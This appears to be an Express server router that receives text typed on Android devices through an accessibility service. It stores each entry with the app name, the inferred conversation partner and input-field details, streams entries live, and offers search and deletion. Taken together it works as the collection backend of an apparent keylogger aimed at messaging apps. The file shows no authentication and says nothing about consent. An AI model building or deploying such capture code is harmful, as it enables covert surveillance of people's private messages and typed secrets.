import { Router } from 'express'
import { db } from '../db/client.js'
import { broadcast } from '../sse.js'
import { TEXT_ROLE_PRIORITY } from '../appRoles.js'

const router = Router()
const IGNORED_TYPED_TEXT = new Set([
    'message',
    'type a message',
    'write a message',
    'send a message',
    'send chat',
    'ask google',
])
const TARGET_INHERIT_MINUTES = 90

function normalizeTypedText(value) {
    return String(value ?? '').trim().toLowerCase().replace(/\s+/g, ' ').replace(/[.!?…]+$/g, '')
}

// POST /api/typed-text — called by the Android accessibility service
router.post('/', async (req, res) => {
    const {
        deviceId, packageName, appLabel, targetName, text, capturedAt, appRole,
        rawPackage, rawAppLabel, resolvedPackage, resolvedAppLabel,
        attributionSource, attributionConfidence, targetSource,
        className, viewId, hintText, contentDescription, inputType, eventType,
    } = req.body

    if (!deviceId || !packageName || !text || !capturedAt) {
        return res.status(400).json({ error: 'Missing required fields: deviceId, packageName, text, capturedAt' })
    }
    if (appRole && !TEXT_ROLE_PRIORITY.includes(appRole)) {
        return res.status(400).json({ error: 'Unknown appRole' })
    }
    if (IGNORED_TYPED_TEXT.has(normalizeTypedText(text))) {
        return res.status(202).json({ status: 'ignored' })
    }

    try {
        let effectiveTarget = targetName ?? ''
        let effectiveTargetSource = targetSource ?? (String(effectiveTarget).trim() ? 'client' : null)
        if (!String(effectiveTarget).trim()) {
            const captured = new Date(capturedAt)
            if (!Number.isNaN(captured.getTime())) {
                const inherited = await db.query(
                    `SELECT target_name
                       FROM typed_text
                      WHERE device_id = $1 AND package_name = $2
                        AND coalesce(target_name, '') <> ''
                        AND captured_at >= $3::timestamptz - make_interval(mins => $4)
                        AND captured_at < $3::timestamptz
                      ORDER BY captured_at DESC
                      LIMIT 1`,
                    [deviceId, packageName, captured.toISOString(), TARGET_INHERIT_MINUTES]
                )
                effectiveTarget = inherited.rows[0]?.target_name ?? ''
                if (effectiveTarget) effectiveTargetSource = 'server_inherited'
            }
        }

        const cleanRawPackage = String(rawPackage ?? packageName).slice(0, 255)
        const cleanRawAppLabel = String(rawAppLabel ?? appLabel ?? '').slice(0, 255)
        const cleanResolvedPackage = resolvedPackage == null ? null : String(resolvedPackage).slice(0, 255) || null
        const cleanResolvedAppLabel = resolvedAppLabel == null ? null : String(resolvedAppLabel).slice(0, 255) || null
        const cleanAttributionSource = attributionSource == null ? null : String(attributionSource).slice(0, 64) || null
        const cleanClassName = className == null ? null : String(className).slice(0, 500) || null
        const cleanViewId = viewId == null ? null : String(viewId).slice(0, 500) || null
        const cleanHintText = hintText == null ? null : String(hintText).slice(0, 1000) || null
        const cleanContentDescription = contentDescription == null ? null : String(contentDescription).slice(0, 1000) || null

        const result = await db.query(
            `INSERT INTO typed_text (
                device_id, package_name, app_label, target_name, raw_package, raw_app_label,
                resolved_package, resolved_app_label, attribution_source, attribution_confidence,
                target_source, class_name, view_id, hint_text, content_description,
                input_type, event_type, text, captured_at
             )
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19)
             RETURNING *`,
            [
                deviceId,
                packageName,
                appLabel ?? '',
                effectiveTarget,
                cleanRawPackage,
                cleanRawAppLabel,
                cleanResolvedPackage,
                cleanResolvedAppLabel,
                cleanAttributionSource,
                Number(attributionConfidence) || 0,
                effectiveTargetSource,
                cleanClassName,
                cleanViewId,
                cleanHintText,
                cleanContentDescription,
                inputType == null ? null : Number(inputType),
                eventType == null ? null : Number(eventType),
                text,
                capturedAt,
            ]
        )
        const row = result.rows[0]
        broadcast('typedtext', row)
        return res.status(201).json({ id: row.id, status: 'created' })
    } catch (err) {
        console.error('POST /api/typed-text error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

// GET /api/typed-text — paginated history for later usage
router.get('/', async (req, res) => {
    const limit  = Math.min(200, Math.max(1, parseInt(req.query.limit ?? '50')))
    const offset = Math.max(0, parseInt(req.query.offset ?? '0'))
    const device = req.query.device  || null
    const pkg    = req.query.package || null
    const search = req.query.search  || null

    const conditions = []
    const params = []

    if (device) {
        params.push(device)
        conditions.push(`device_id = $${params.length}`)
    }
    if (pkg) {
        params.push(pkg)
        conditions.push(`package_name = $${params.length}`)
    }
    if (search) {
        params.push(`%${search}%`)
        conditions.push(`(text ILIKE $${params.length} OR target_name ILIKE $${params.length} OR app_label ILIKE $${params.length} OR package_name ILIKE $${params.length} OR raw_app_label ILIKE $${params.length} OR resolved_app_label ILIKE $${params.length})`)
    }

    const where = conditions.length ? `WHERE ${conditions.join(' AND ')}` : ''

    try {
        const [dataResult, countResult] = await Promise.all([
            db.query(
                `SELECT id, device_id, package_name, app_label, target_name, raw_package, raw_app_label,
                        resolved_package, resolved_app_label, attribution_source, attribution_confidence,
                        target_source, class_name, view_id, hint_text, content_description,
                        input_type, event_type, text, captured_at, received_at
                 FROM typed_text
                 ${where}
                 ORDER BY captured_at DESC, received_at DESC
                 LIMIT $${params.length + 1} OFFSET $${params.length + 2}`,
                [...params, limit, offset]
            ),
            db.query(`SELECT COUNT(*) FROM typed_text ${where}`, params)
        ])

        const total = parseInt(countResult.rows[0].count)
        return res.json({
            data: dataResult.rows,
            pagination: { limit, offset, total, hasMore: offset + limit < total }
        })
    } catch (err) {
        console.error('GET /api/typed-text error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

// DELETE /api/typed-text — bulk hard-delete by id list
router.delete('/', async (req, res) => {
    const { ids } = req.body ?? {}
    if (!Array.isArray(ids) || ids.length === 0) return res.status(400).json({ error: 'ids array required' })
    try {
        const result = await db.query('DELETE FROM typed_text WHERE id = ANY($1::bigint[])', [ids])
        broadcast('typedtext:deleted', { ids })
        return res.json({ deleted: result.rowCount })
    } catch (err) {
        console.error('DELETE /api/typed-text error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

export default router
